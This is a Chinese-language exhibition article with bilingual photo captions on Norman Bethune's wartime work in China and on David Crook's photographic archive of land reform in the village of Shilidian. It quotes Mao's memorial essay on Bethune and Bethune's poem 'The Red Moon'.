<p>1938 年，作为交通中转站的武汉，无论搭乘火车轮船还是步行，亿万的难民从这里经过。青年学生和艺术家们在这一次大迁徙中，通过歌声和一个城市的展览场化解着绝望。在这情感饱满的时刻，民众在必败的迁徙中焕发新的斗志。城市的歌声伴随着前方战场无休无止的枪炮声，而放下画笔和刻刀，带领市民唱歌的年轻艺术家们，因战争而重新建立起对于艺术的理解。</p>
<p>时代的声音和无名者的私语交织在一起。</p>
<p>诺尔曼·白求恩就是这时，抵达被称为 “东方马德里” 的武汉。和他有相似经历，从西班牙战场转到中国战场的人还有：尤里斯·伊文思、罗伯特·卡帕、罗曼·卡尔曼、奥登、朱利安·贝尔、安娜·路易·斯特朗…</p>
<p>在这次以摄影为主要文献的展览中，拍摄了白求恩最著名的那张照片的摄影家吴印咸，在武汉的桥洞下接过了<strong>伊文思</strong>的摄影机和胶片，开创了中共电影史的新篇章。而另一位不那么引人注意的摄影家、更多作为艺术干部而被了解的罗光达，正如千千万万的有爱国心的青年一样，也经由武汉前往延安。</p>
<p>命运如此交织。信念与行动相伴。</p>
<p><strong>白求恩：和毛泽东的碰面，去华北前线</strong></p>
<p>或许如白求恩的助手琼尤恩所回忆的，“… 毛泽东与白求恩像兄弟似地拥抱在一起了”。但无论如何，在一张他们的合影中我们可以观察到微妙的情绪。而此外，则是在白求恩去世一个多月后，毛泽东所撰写的著名的《纪念白求恩》一文的巨大影响力。</p>
<p>他们交谈的一幕，被几位油画家所描绘，又通过宣传画的大量印刷，和被诵读的文本一同成为中国人的深刻记忆，并使得加拿大在那个时期成为少有的被普通中国人所知晓的西方国家。作为新中国时期重要的艺术创作题材的白求恩，他的英雄故事的视觉建构和政治形态始终紧密纠葛。</p>
<p>白求恩认为他应该在前线工作，作为一名经验丰富的外科医生，他曾经在 49 个小时内连续为 71 位受伤的战士进行手术。这是他的自我期许。</p>
<p>从某种意义上，白求恩是一名医生，但也是一名患者。正如他的书信所提及，献祭自己才能在欢愉的毁灭里重生。焦躁、自毁、写着没有回音的信，大量的战场前线的手术。在这一非凡的，令人尊重的行医经历中，职业化和革命化弥合。治病救人，对于白求恩而言，这不仅自我圣化的过程，也是革命的隐喻。无论如何，这是他人生中的一段特殊的时光。</p>
<p><strong>葬礼、隆重的悼念：战时摄影机制的生成</strong></p>
<p>白求恩在去世之后，以一种前所未有的方式和规模被塑造成一个英雄。美术、摄影、雕塑等方式的艺术创作，伴随着政治仪式而被充分激发。1939 年，正是边区的中共政权逐步理解并大量运用作为现代性工具的摄影的关键时期。抗战初期，中共方面只有不多的几位摄影者，其中就包括拍摄过白求恩的沙飞、吴印咸、罗光达。很快，这个队伍迅速扩大，一名摄影者能够培养上百名随军摄影战士。摄影训练班的开展提供了一套摄影者的培育系统和图片评价标准，也提供了一套图片拍摄、传播和观看的现代意义的图像生产方式。</p>
<p>战争时期摄影正是新中国摄影史的序篇。新中国摄影话语的建构，是围绕着对于战争时期摄影话语的吸纳、转化和改造展开的。这不但是因为革命时期产生的图像政治意识形态,以及作为核心题材的战争和生产共同蕴含着“劳动”、“超越”和“新人”,也和拍摄者在他们最重要的摄影时期所奠定的经验、方式乃至风格密切相关。</p>
<p>白求恩正是一个英雄的故事的讲述。这个故事的内容成为事件、传记、历史与神话，而这个故事被讲述的方式，随着时间的推移与累进，变成了一整套行之有效的图像制造与传播的模式，即战时摄影机制的生成。</p>
<p><strong>作为历史的图像</strong></p>
<p>在整理战争时期的摄影档案时，我发现了一些白求恩的新的图像，并且意识到，这不仅是三个摄影家生涯中的一组有交集的专题，而且也是正在生成中的战时摄影工作机制的一个标志性事件。</p>
<p>这些材料不但成为 2015 年出版的图录的一个章节，也随后和几位同仁合作了另一个展览和研讨。在之后的三年里，关于白求恩的阅读讨论和对于北美档案馆和图书馆存留白求恩的文献的整理研究始终持续，如今这些工作终于有机会展览出版。</p>
<p>被英雄叙事所遮蔽而被试图重新打开的白求恩，他到底是谁呢？医生，战士，英雄，业余艺术家，抑或其他。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmV1uWa1LRZ5mnZuuiclEzSrcqm4HTClMyRbz49jobxN2iaFUfa3Ty95fw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>白求恩在山西五台松岩口模范病室动手术</strong> </p>
<p>Norman Bethune operating on a wounded soldier in a model ward in the village of Songyankou, Wutai Mountain, Shanxi Province</p>
<p>1938</p>
<p>沙飞</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>沙飞家属保存，这张原始底片一共印放过三幅照片，这是其中的一幅，另两幅分别藏于国家博物馆和广东美术馆。</p>
<p>Preserved by Sha Fei’s family, One of the three photographs developed from this negative film. the other two collected by the National museum of China and Guangdong Museum of Art respectively.</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm4J9Y7j2icfYG4vz0pgria7xABodl31g9h6xsb1u324d4XUPC06MN0qcw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>白求恩在游泳</strong></p>
<p>Norman Bethune swimming in the river</p>
<p>1939</p>
<p>沙飞</p>
<p>数字微喷 Inkjet Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm2ibQep7ocqzt3etJXib0BIL6biazI6G0nsASUp88U4EDZlOBKtT6JYN2w/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>白求恩在河北涞源孙家庄小庙给伤员做手术</strong></p>
<p>Norman Bethune operating on a wounded man in a samll temple in Sunjiazhuang, Laiyuan District, Hebei Province</p>
<p>1939</p>
<p>吴印咸</p>
<p>数字微喷 Inkjet Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmOLtRth95ePULljJMNibO9PlzyiaDicjpibqiau4Za2Bhic7TG5NpzTbBl5ew/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>白求恩穿着加拿大救援制服在写作</strong></p>
<p>Bethune is writing, he is wearing the uniform of the Canadian rescue</p>
<p>1937</p>
<p>Hazen Sise</p>
<p>数字微喷 Inkjet Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmGATphBoW9WZcJR8Szbu0yqWKQDxTd8P60dVeuohX95VA0X9grib7cNA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>诺尔曼 · 白求恩</strong></p>
<p>Norman Bethune, Madrid</p>
<p>1937</p>
<p>Hazen Sise</p>
<p>数字微喷 Inkjet Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmWCRhuCT6JSXDCiayo2dkHCianUlFAZBk6S2up3UkFTsic30gVfHRUtBUA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>这是迄今为止所能看到的唯一一张毛泽东与白求恩的合影，拍摄于 1938 年，延安。</strong></p>
<p>This is so far the only known photo in which Ma Zedong and Norman Bethune appeared together, taken in Yan’an in 1938.</p>
<p>1938</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>此照片由白求恩朋友莉莲的儿子比尔先生提供</p>
<p>The photo was provided by Bill, son of Bethune’s friend, Lilian.</p>
<p><strong>纪念白求恩</strong></p>
<p>毛泽东 1939 年 12 月 21 日</p>
<p>白求恩同志是加拿大共产党员，五十多岁了，为了帮助中国的抗日战争，受加拿大共产党和美国共产党的派遣，不远万里，来到中国，去年春上到延安，后来到五台山工作，不幸以身殉职，一个外国人，毫无利己的动机，把中国人民的解放事业当作他自己的事业，这是什么精神？这是国际主义的精神，这是共产主义的精神，每一个中国共产党员都要学习这种精神。列宁主义认为：资本主义国家的无产阶级要拥护殖民地半殖民地人民的解放斗争，殖民地半殖民地的无产阶级要拥护资本主义国家的无产阶级的解放斗争，世界革命才能胜利。白求恩同志是实践了这一条列宁主义路线的。我们中国共产党员也要实践这一条路线。<strong>我们要和一切资本主义国家的无产阶级联合起来，要和日本的、英国的、美国的、德国的、意大利的以及一切资本主义国家的无产阶级联合起来，才能打倒帝国主义，解放我们的民族和人民，解放世界的民族和人民。这就是我们的国际主义，这就是我们用以反对狭隘民族主义和狭隘爱国主义的国际主义。</strong></p>
<p>白求恩同志毫不利己专门利人的精神，表现在他对工作的极端的负责任，对同志对人民的极端的热忱。每个共产党员都要学习他。不少的人对工作不负责任，拈轻怕重，把重担于推给人家，自己挑轻的。事当前，先替自己打算，然后再替别人打算。出了点力就觉得了不起，喜欢自吹，生怕人家不知道。对同志对人民不是满腔热忱，而是冷冷清清，漠不关心，麻木不仁。这种人其实不是共产党员，至少不能算一个纯粹的共产党员。从前线回来的人说到白求恩，没有一个不佩服，没有一个不为他的精神所感动。晋察冀边区的军民，凡亲身受过白求恩医生的治疗和亲眼看过白求恩医生的工作的，无不为之感动。每一个共产党员，一定要学习白求恩同志的这种真正共产主义者的精神。</p>
<p>白求恩同志是个医生，他以医疗为职业，对技术精益求精；在整个八路军医务系统中，他的医术是很高明的。这对于一班见异思迁的人，对于一班鄙薄技术工作以为不足道、以为无出路的人，也是一个极好的教训。</p>
<p>我和白求恩同志只见过一面。后来他给我来过许多信。可是因为忙，仅回过他一封信，还不知他收到没有。对于他的死，我是很悲痛的。现在大家纪念他，可见他的精神感人之深。我们大家要学习他<strong>毫无自私自利之心的精神。从这点出发，就可以变为大有利于人民的人。一个人能力有大小，但只要有这点精神，就是一个高尚的人，一个纯粹的人，一个有道德的人，一个脱离了低级趣味的人，一个有益于人民的人。</strong></p>
<hr>
<p>历史上，总有人慷慨无私、舍己为人，他们超越了特有的意识形态、宗教信仰或政治倾向，为一个信念奉献一生。他们的信念决定了其人生道路，并引导他们不断帮助他人。所有渴望改变世界的年轻人都应该以他们为榜样。</p>
<p>白求恩便是其中之一。他毕生致力于为弱势群体服务，先后在祖国加拿大、西班牙和中国行医，最终于中国去世。</p>
<p>他出身医学专业，是北美地区当时著名的结核病医生。他尤其关注底层人民，并首次向政府提议了公共医疗卫生计划，几年后该计划在加拿大得以推行。</p>
<p>1936 年 7 月，由希特勒与墨索里尼支持的西班牙弗朗哥将军挑起了反对共和国政府的内战。  全世界的目光都聚焦在了西班牙，这被认为是法西斯主义愈发猖獗后民主政府的首次抵抗。白求恩放弃了优越的职业环境与社会地位于同年 11 月抵达西班牙，开始为共和国提供医疗服务，还组建了将血液输送至前线的先锋小队 “加拿大输血队”。  1937 年 2 月，法西斯军队围攻西班牙南部城市马拉加。民众由于害怕法西斯势力的反扑而纷纷逃散。整整一个星期里，全城十五万人经受着来自地面和空中的袭击，还有由德国和意大利军队援助的反动军队投来的海上炸弹袭击。白求恩和他的加拿大同事们第一个站出来救助逃亡的居民。</p>
<p>5月底,白求恩返回加拿大为西班牙共和国筹集资金…</p>
<p>为了筹措资金支持在西班牙的项目，他在加拿大与美国各地竭力奔走呼告。然而，1937 年 7 月日本侵略中国时，白求恩明白中国更加需要他作为医生的帮助 “西班牙和中国参加的是同一场战争。我要去中国，我觉得那里的需求更为迫切，在那里我会更加有用。”</p>
<p>在纽约筹集资金后，他于 1938 年 1 月抵达香港，并在艰难漫长的跋涉后于 6 月抵达了八路军的总部……</p>
<hr>
<p>今晚这依旧苍白的月亮，那么宁静、清澈而高远，映照着我们黯然而焦虑的目光啊，这挂在加拿大上空的凄冷的圆月</p>
<p>支离破碎的西班牙的山峦上，昨夜，挂着一轮炙热耀眼的月亮,在明亮的外壳下,隐着亡者满是血污的面颊</p>
<p>仰望这轮圆盘，我们攥紧了拳头，对着众多无名的死者，我们重新起誓，“战友们，为自由和未来而战，为人类福祉而亡，将永远被铭记”</p>
<p>​                                                        —— 西班牙局势恶化，1936 年 10 月 17 日，佛朗哥军队向伊列斯卡斯发动了攻势。白求恩写了这首《红月亮》表达自己的感受。</p>
<p>And this same pallid moon tonight, Which rides so quietly, clear and high, The mirror of our pale and troubled gaze, Raised to a cool Canadian sky.</p>
<p>Above the shattered mountain tops, Last night, rose low and wild and red Reflecting back from her illumined shield, The blood bespattered faces of the dead.</p>
<p>To that pale disc, we raise our clenched fists, And to those nameless dead our vows renew, “Comrades, who fought for freedom and the future world, Who died for us, we will remember you.</p>
<p>​                                                             —— The situation of Spain got worse, on October 17, 1936, Francos army launched an offensive attack against Illescas. Norman Bethune wrote down “The red moon”to express his feelings.</p>
<hr>
<p><strong>华北一个村庄的革命：柯鲁克档案</strong></p>
<p>文 &#x2F; 高初 王烁</p>
<p>柯鲁克档案作为一个章节,有其特别的意义。</p>
<p>围绕革命史研究的视觉材料的收集是一项艰难的工作。如果侥幸得知档案的线索，并且恰逢好的机会，或许得以在档案馆调取案宗。如莫斯科的俄罗斯国家与社会政治历史档案馆所存中共红军时期和工人运动档案、胡佛档案馆所存 Alexander Hochman 和托派档案、台湾国民党党史委员档案馆存国共两党的图像档案等。但围绕革命的视觉材料的研究，尤为需要通过生命史或是家族史的方式进行。而档案的汇集、整理和研究，往往也和口述史的方式密切相关这种借助私人留存的文献（民间档案 &#x2F; 浮游档案）进行研究的过程不仅是史料的收集方式，也是以研究者的情感的积累过程。在和王烁女士的共同努力下柯鲁克的家族档案已陆续结集 40 余卷。而这些工作要回溯到 2011 年 2 月高初和柯鲁克家长子柯鲁先生的一封通信：</p>
<p>“我在等待春暖花开的工作重新开始的第一日，给您写了这封信”，“今年我最重要的时间和精力的安排已经安排给您的母亲伊莎贝尔柯鲁克，我期待她宝贵的记忆能够保留下来。”… “从 3 月到年底的时间里，我但愿每隔几天（或是连续几周）都能有 1 个小时的时间和您的母亲谈谈她的经历，以及这些图片。我期待我们见面并谈及下一阶段的计划。”</p>
<p>在 2011 年秋到 2012 年初夏，每周一和周四上午十点，我们会来到伊莎白·柯鲁克家里，请她一张张地观看已故去的大卫·柯鲁克六七十年前在中国拍摄的照片，并讲出每一张照片能勾连起的任何回忆。1947 年底，柯鲁克夫妇带着英国共产党的介绍信，从利物浦乘船到达天津，以国际救济署工作人员的身份进入华北村庄十里店，考察中国共产党正在进行的土地改革。人类学在读博士伊莎白和想成为记者的大卫在十里店住了大半年，在此期间，大卫拍摄了近千张照片，细腻地记录了这个传统而典型的华北村庄所经历的重大变革，以及变动中的日常生活。作为土地改革这一历史事件的另一亲历者，伊莎白在六十多年后重新观看、审视当年留下的照片，除了凭强大记忆力而唤回的当时情形，还讲述了自己半个多世纪以来对土地改革乃至中国革命的不断思考和未曾停滞的重新认识。</p>
<p>大卫·柯鲁克 1947 年底至 1948 年夏天在十里店拍摄的照片是我们进入这位英国共产党员留下的影像资料的起点，其实他在更早的 1938 年就到了上海，1940 年夏又去了成都，因此，日据时期的上海、国民政府时期的西南、共产党统治下的华北构成了大卫摄影生涯的主体。1938 年，当时正在西班牙执行特工任务的大卫被派往上海继续监视托洛斯基派，而在此之前，这位出生于伦敦犹太家庭、毕业于哥伦比亚大学、被学生运动和有关苏联 “工人天堂” 的读物改变了 “当百万富翁” 梦想的年轻共产主义者已参加了国际纵队，在西班牙内战中负过伤。他在上海伪装成圣约  翰大学的一名教师，一边执行特工任务一边观察这座城市，在西班牙做特工时的伪装身份——记者——使他善于用镜头记录下对他有所触动的人和事。1940 年，当和克格勃上级失去联系后，他决定前往 “大后方” 去看看内陆中国，于是长途跋涉到了成都，并在那里遇到了今后的妻子、出生在成都的传教士家庭女儿伊莎白。在成都及其周边地区的一年左右时间里，大卫拍摄了那里的耕作、寺庙、街道、人群，并特别注意战争对人们生活的影响：大量关于 “漫漫长夏中几乎每个晴天都会发生的空袭的照片，还有摄影师自己制作的 “空袭”、“战争状况下的农业中国”、“战争影响下的食物状况” 的专题小册子，黑卡纸上贴上照片，写下摄影师对这类问题的观察与理解——“粮食是限量供应的吗？”</p>
<p>随着访谈和研究的深入，我们发现照片只是围绕着大卫及其家庭的档案资料的冰山一角。柯鲁克一家与中国和中国革命紧密相连而且很多家庭成员都有写信、写日记或做笔记的习惯,因此在不同时期留下了大量与当时社会状况相关的珍贵记录。单就大卫的摄影作品而言，除了照片之外，还有他当年用打字机为每张照片做的文字说明，底片的冲印小样及各种注释，用卡纸制作的针对不同专题的图文并茂的小册子，有关照片的各种手稿，拍摄发生的日子里留下的日记、书信，以及和本书华北农村卷紧密相关的《十里店》一书的未曾发表的原始书稿。这个形式丰富、时间跨度长达七十年的原始资料体系，若能被很好地整理发掘，不但可以理解一位国际共产主义者、一对后半生在中国度过的英国共产党夫妇眼中的中国革命，也可以从中窥见国际共产主义运动和从上世纪初至今社会变革的线索。</p>
<p>直至今年的柯鲁克自传的翻译出版和文献集的整理结集，这项工作已做了将近七年。我们与这个家庭素昧平生，一个偶然的机会使双方彼此了解，之后全家人给予了我们巨大的信任与支持，才使得这个项目得以延续至今，稍有成果。时隔六七十年，当年留下的手稿有的已开始涣漫不清，纸张也面临着支离破碎的危险，为了更好地保存信息和进一步利用这批资料，我们经常要将部分资料原件借出，带回工作室进行整理和扫描。柯鲁克一家以无比的信任和分享珍宝的宽广胸怀将一箱箱原始资料交到我们手上，从未催促归还。与伊莎白·柯鲁克的访谈和交往伴随我们度过了 26 岁到 30 岁的时光，而这四年是她 96 岁到 100 岁的四年，集中进行口述访谈的大半年里，她将一周两天里精神最好的上午留给了我们，热情地回顾自己早年的经历，以及近年来对中国社会的思考。在一些问题上，我们展开了认真、坦诚、深入的讨论，即使最终未能说服彼此，也觉得收获颇多。除伊莎白外，我们还与柯鲁克夫妇的三个孩子柯鲁、马凯、鸿冈围绕这批材料进行过多次讨论会，获得了各种帮助，也被他们参与社会事业的热情所鼓舞。</p>
<p>自 2012 年至 2014 年，围绕十里店的档案考证高初也在村庄里断断续续地住了八个月。这些照片成为敲开每一家门的钥匙，外国革命者曾经历和观察的激荡中的华北农村的笔记和图像，逐渐在采访中转化为村民的生命史、家史、宗族史和村史。藉由这些档案，自下而上地重新理解和写作传统中国、革命中国和现代中国在一九四零年代末的丰富状态成为了可能。对于每一位村民而言，或是对于这个不起眼的北方的小村庄作为整体，“关于未来的正义” 的概念，如何转化为政策及其执行，如何被理解和接受、应对和修正，也许折射着更为复杂的面相。“革命” 这个语词在村民那里毫无意义，他们怎么理解突然间来的这些人，理解他们做的事，理解一种不一样的观念；甚至他们自己不理解的时候，他们的后代是否能突然间对于已经发生了的生活的巨大变动，有一个追认的理解，这些是我所关心的问题。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmEYUzg2VwHicNNWnMByPIX4OgRKZMmqwhOvblNo0fZeJsZqwr308bkUw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>陈永贵</strong></p>
<p>Chen Yonggui</p>
<p>1960s</p>
<p>高帆</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmLRCXapiaEJd4VTyafs6ibUxLSFwZVZjzoVZJiczJ3bnU1t9FpaNVFmLrg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmZ32c4Pu8oFkOQiakbYJXicAQricCO2Vwia5IOUrJVa70q0icEjYzuMbxlKw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmgQSszJSlY3mKdHaXYUAiaOPM0InlIicibMz5ZOwuntA2APXQj9uaFwpGA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmiauBvibBQMGiboebnicDlibib8I8q9vQsRfDBTMqkcib9OmkyEwCicqkjkQ69w/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmWwz47SBTjjAHG8hKP9n55yKftbIJ17AMiaVmoiaTEKHaJHBNOx4YEicXQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm5Z36bgTxYNkXQekXicozv1UMScw1wX3CCNhFWeohNibh8HEQMwia0flgQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmrBPibFVcVuCG93SraaKDYSJbM77ibfAuajZOZd5eD2Wz0tA5cMayCBCw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm5Dneck1P4e05VFwwA7YukkGEjRlQC2M2TApzosXOOafia4x17Qndhyw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmSxjN5JXvqanqF3D7tnaxkwwlCW5zq9EfIsmfBD0HrnJDaQqOLBSibfQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmxjQHJwAMtXMlGQa0v4lWIQkKpGSFVnxdSfg9tKcUiaWN9IS6c4ILpxw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm9bF1q2WjK3GYmJLYut0AXA3pyyhJdtktGFyLb3ZUicZMfU3ku9kINsQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmj96BOYG4bS6ENyia52IpZ0PAgPdk8WXNux6ZMGuy7P6MjOIiaic1fu3Gw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmNhp5HmwvotTqLicpU2KZjfBXFJWxk6zFFiad0V1Qm7Mjbj6oU3X4A1VA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm8WjhLbOCwFUgR6zIB1B81WKJduu5SvsASz753DlLdd4LLgBlnnOMsw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmnSnic6525nFBiarsRucichvsBeZPvwfKuKUBPoV6PTtzetMQoGE2LmC3g/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmuvOS9SCIxGKKZZKibgibHTrImeRBhbibGUZdsp3zYToOgWVSL3cfTSTYw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmbPY4mnaY5SqGicvqKysDTOobQmexC0YqvUUfBsXVSVrLKWE6D9BYKhw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmbToIiazXYnupnAjrwRPMvABMiaw2fpZbRD6e9YWVeic08hv5yFg0lZpTA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmyyIzL4YDSzC4gWTgfypgLLwtibwQSdcE4HibKQaejPwAibMljhZP9gPiag/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmQEpboib15Iz8MACfVZMHvlOa3rR1QnD7htIVMKmAxMOfICEdXYWpcYw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmpEnEk6JzVW988iapd682jHzypEVYE7IPqzE4ZXIxRPHy08gAfUaJbVA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmsnh4KRdzngg2OgNPAUAJC5oWtmCSHa4ElAcicBE1x1GNKP7h2JwQTjg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmO63icspviaG4Ry7yyAZuuxkYaPQ5IQkAibAbqL13HVhxtaVTR2YibBLWFA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm8GYSw7nphMDauKS2I5HM4RCPpAzYIwtwib6mdVcVdc8afqDic7jFogwQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm6XeZWqPYLGCqMwse1XfQHcjYCpCQRHUl8LTNEI8L3wCTLSbibFub7Ug/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm3p3KffeJLBIa4qB5360ibzAgYEeSLxXkh6BwbEx3zBVATDAGVrdlV9w/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmVghpdCdMbMxPGwNtjYWQOPFspGX7AIiaxiaoQXLdiahI7H0j7Bnpug95g/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmE6dZltq6wkGjiazTmEBOG3jcnXNzgvodueJLN8lg3WVvEqibt1KgsCzA/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmMHFcMiaZZiaD21hksua6eA5FwrmZUJP7WLDictQjXiamTMMazQG5OoP01g/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmlqpUM75NFnpx2meBZEdyABsXIRFDQl2gkyPfEwFu7CucLhputh80kg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmiabsX80aBQCWDSkNxsvrD3asr963ibmOCG9V2yQercumlULXxHDJZsCQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmXdTl3TcTOeygEMQLXHtXJoSha4drn43ysYS5Swv4dfS8kP7mVXbbzw/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmqxibUCDLMWff9cTSCS8lvZ4VVicYlNQT0MibA9AR1pPvlH2elPNcEwWew/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmWo1cDdEnZ5JkXib9aJwibcycbFDYF4m5XxMORn9A77eBYTeTtdXep6Yg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmA16cuicGL5Tft5LRxr1HunR8RE4iaRWEhkaojkiaevoVHlMgPBwXWmoCg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmRMibM2WtJLbRYumshBN9v11sQ1gza7N5nI7uV4syeVPpw0amTGkPgLg/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmroqsgOlTrzXS9Q36TSqH28afxIicAalC6typMwtGCYDlpwmUnAeibOPQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm6jgprrlddu0tfJNgab9zOkgM7icNo0Skpu4iaCsicTgOiabwhP8df8eb1Q/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmCkODINg0cBUaOlCmiauQR85WV7xOgTZXgUSUcy42r2jOtzicHicriaehiaw/640?wx_fmt=jpeg" alt="img"></p>
